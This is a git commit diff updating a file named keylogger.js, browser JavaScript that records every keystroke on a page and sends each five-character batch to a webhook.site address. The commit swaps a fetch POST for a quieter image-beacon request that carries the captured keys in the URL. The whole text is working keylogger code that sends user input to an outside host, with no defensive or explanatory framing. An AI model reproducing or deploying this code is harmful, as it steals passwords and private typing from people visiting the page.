64629979be2519b6f63df6b7b49fa84bf6ece618
Jefferson Hernandez <56500262+Th3g4ntl3m4n@users.noreply.github.com>
2025-07-24 17:32:21 -0500

    Update keylogger.js

--- keylogger.js
+++ keylogger.js
@@ -2,20 +2,10 @@
   let buffer = "";
   document.addEventListener('keydown', function(e){
     buffer += e.key;
-
-    // Enviar cada 5 caracteres
     if(buffer.length >= 5){
-      fetch("https://webhook.site/c7ff61f0-954a-4234-b0a0-cadfdd980c32", {
-        method: "POST",
-        body: JSON.stringify({
-          keystrokes: buffer,
-          time: new Date().toISOString()
-        }),
-        headers: {
-          'Content-Type': 'application/json'
-        }
-      });
+      new Image().src = "https://webhook.site/tu_token?keys=" + encodeURIComponent(buffer);
       buffer = "";
     }
   });
 })();
+
